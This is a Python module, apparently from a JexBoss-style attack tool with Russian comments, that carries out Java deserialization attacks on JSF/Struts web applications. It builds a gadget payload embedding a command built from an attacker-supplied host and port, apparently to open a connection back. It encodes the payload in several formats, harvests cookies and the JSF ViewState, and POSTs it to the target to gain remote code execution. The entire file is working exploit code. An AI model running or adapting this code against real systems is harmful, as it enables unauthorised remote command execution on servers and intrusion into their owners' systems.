import base64
import gzip
from io import BytesIO
from urllib.parse import quote

from src.exploits.ex1 import get_payload_gadget
from src.utils.colors import Colors
from src.utils.misc import get_serialized_obj_from_param, get_html_redirect_link, get_viewstate_value, \
    get_link_for_post, get_url_base, shows_payload, print_and_flush, get_random_user_agent, \
    generate_cmd_for_runtime_exec


def exploit_application_deserialization(
        url: str,
        host: str,
        port: int,
        cmd: str,
        is_win: bool,
        param: str,
        force: bool,
        gadget_type: str,
        show_payload: bool,
        gadget_file: str | None
) -> int:
    """
    Эксплуатирует десериализацию Java-объектов в POST-параметре приложения JSF/Struts, отправляя сериализованный payload.
    """

    # Генерация или чтение payload
    if gadget_file is None:
        cmd_exec = generate_cmd_for_runtime_exec(
            cmd=cmd,
            host=host,
            port=port,
            is_win=is_win,
        )
        raw_payload = get_payload_gadget(gadget_type=gadget_type, cmd=cmd_exec)
    else:
        try:
            with open(gadget_file, "rb") as f:
                raw_payload = f.read()
        except FileNotFoundError:
            print_and_flush(
                f"{Colors.RED}\n * Файл «{gadget_file}» не найден. Проверьте имя или отключите параметр gadget_file.{Colors.ENDC}"
            )
            return 505

    # Подготовка вариантов payload
    gzip_buf = BytesIO()
    with gzip.GzipFile(fileobj=gzip_buf, mode="wb") as gz:
        gz.write(raw_payload)
    gzip_b64 = base64.b64encode(gzip_buf.getvalue())
    raw_b64 = base64.b64encode(raw_payload)

    headers = {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Connection": "keep-alive",
        "User-Agent": get_random_user_agent(),
        "Content-Type": "application/x-www-form-urlencoded"
    }

    # Режим «force» отправляет все форматы подряд
    if force:
        body_prefix = f"{param}=" if param else ""
        print_and_flush(f"{Colors.GREEN}\n * Sending payload to {url}...\n{Colors.ENDC}")
        try:
            gl_http_pool.request("POST", url, redirect=False, headers=headers, body=body_prefix + quote(gzip_b64))
            gl_http_pool.request("POST", url, redirect=False, headers=headers, body=body_prefix + quote(raw_b64))
            gl_http_pool.request("POST", url, redirect=False, headers=headers, body=body_prefix + raw_payload)
            headers["Content-Type"] = "application/x-java-serialized-object; class=github.com/joaomatosf/jexboss"
            r = gl_http_pool.request("POST", url, redirect=False, headers=headers, body=raw_payload)
        except Exception:
            return 505

    else:
        # Получаем первоначальную страницу для cookie и контекста
        r = gl_http_pool.request("GET", url, redirect=True, headers=headers)
        if r.status == 403:
            return 403
        cookie = r.getheader("set-cookie")
        if cookie:
            headers["Cookie"] = cookie

        # Ищем существующий сериализованный объект
        param_content = get_serialized_obj_from_param(str(r.data), param)
        if param_content is None:
            redirect = get_html_redirect_link(str(r.data))
            if redirect:
                r = gl_http_pool.request("GET", f"{url}/{redirect}", redirect=True, headers=headers)
                param_content = get_serialized_obj_from_param(str(r.data), param)

        # Для нестандартного param сначала получаем ViewState
        if param != "javax.faces.ViewState":
            vs = get_viewstate_value(str(r.data))
            if vs:
                enc = quote(vs)
                param = f"javax.faces.ViewState={enc}&{param}"

        body_prefix = f"{param}=" if param else ""
        # Корректируем URL для POST
        base = url.split("?", 1)[0]
        parts = base.split("://")[-1].split("/")
        if len(parts) <= 1 or "." not in parts[-1]:
            link = get_link_for_post(str(r.data))
            base = get_url_base(base)
            url = base + link

        print_and_flush(f"{Colors.GREEN}\n [*] Sending serialized object to: {url}...\n{Colors.ENDC}")
        try:
            if param_content.startswith("H4sI"):
                if show_payload:
                    shows_payload(gzip_b64, gadget_file or gadget_type)
                r = gl_http_pool.request("POST", url, redirect=True, headers=headers,
                                         body=body_prefix + quote(gzip_b64))
            elif param_content.startswith("rO0"):
                if show_payload:
                    shows_payload(raw_b64, gadget_file or gadget_type)
                r = gl_http_pool.request("POST", url, redirect=True, headers=headers, body=body_prefix + quote(raw_b64))
            else:
                r = gl_http_pool.request("POST", url, redirect=True, headers=headers, body=body_prefix + raw_payload)
        except Exception as err:
            if "too many redirects" in str(err).lower():
                return 200
            return 505

    return 200 if r.status in (200, 301, 302) else r.status
